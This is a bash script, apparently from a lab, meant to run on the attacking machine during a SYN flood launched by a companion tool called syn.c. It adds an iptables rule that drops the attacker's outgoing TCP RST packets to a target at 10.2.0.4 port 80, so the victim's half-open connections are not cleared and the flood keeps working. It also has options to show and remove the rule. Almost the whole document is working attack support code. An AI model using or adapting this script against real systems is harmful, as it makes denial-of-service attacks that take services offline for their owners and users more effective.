
#!/usr/bin/env bash
#
# attacker_rst_block.sh - run this on the ATTACKER before `syn bad`.
#
# WHY THIS EXISTS
#   syn.c sends every SYN from a RANDOM source port (1024-65535).
#   The victim answers each SYN with a SYN-ACK to that random port.
#   Because we never "opened" that port, the attacker's own kernel
#   replies with a RST -- which instantly tears down the victim's
#   half-open entry and defeats the flood.
#
#   This drops those outgoing RSTs.
#
# SOURCE PORT IS IRRELEVANT
#   The match is: protocol tcp + destination <target> + destination
#   port 80 + the RST flag set.  It does NOT filter on source port,
#   so the random-sport behaviour of syn.c is fully covered and does
#   not need to change.
#
# USAGE (on the ATTACKER, as root)
#   sudo ./attacker_rst_block.sh apply  10.2.0.4
#   sudo ./attacker_rst_block.sh show
#   sudo ./attacker_rst_block.sh remove 10.2.0.4
#
set -euo pipefail

ACTION="${1:-apply}"
TARGET="${2:-10.2.0.4}"
DPORT="${3:-80}"

RULE=(-p tcp --tcp-flags RST RST -d "$TARGET" --dport "$DPORT" -j DROP)

if [[ $EUID -ne 0 ]]; then
    echo "run me with sudo" >&2
    exit 1
fi

case "$ACTION" in
    apply)
        if iptables -C OUTPUT "${RULE[@]}" 2>/dev/null; then
            echo "[=] rule already present"
        else
            iptables -A OUTPUT "${RULE[@]}"
            echo "[+] added: OUTPUT ${RULE[*]}"
        fi
        echo "[*] current OUTPUT chain:"
        iptables -S OUTPUT
        ;;
    remove)
        removed=0
        while iptables -C OUTPUT "${RULE[@]}" 2>/dev/null; do
            iptables -D OUTPUT "${RULE[@]}"
            removed=$((removed + 1))
        done
        echo "[-] removed $removed matching rule(s)"
        ;;
    show)
        echo "[*] OUTPUT chain:"
        iptables -S OUTPUT
        echo
        echo "[*] RSTs actually leaving to ${TARGET}:${DPORT} (5s sample):"
        timeout 5 tcpdump -ni any -c 10 "dst ${TARGET} and tcp[tcpflags] & tcp-rst != 0" 2>/dev/null || true
        ;;
    *)
        echo "usage: $0 {apply|remove|show} [target_ip] [target_port]" >&2
        exit 1
        ;;
esac
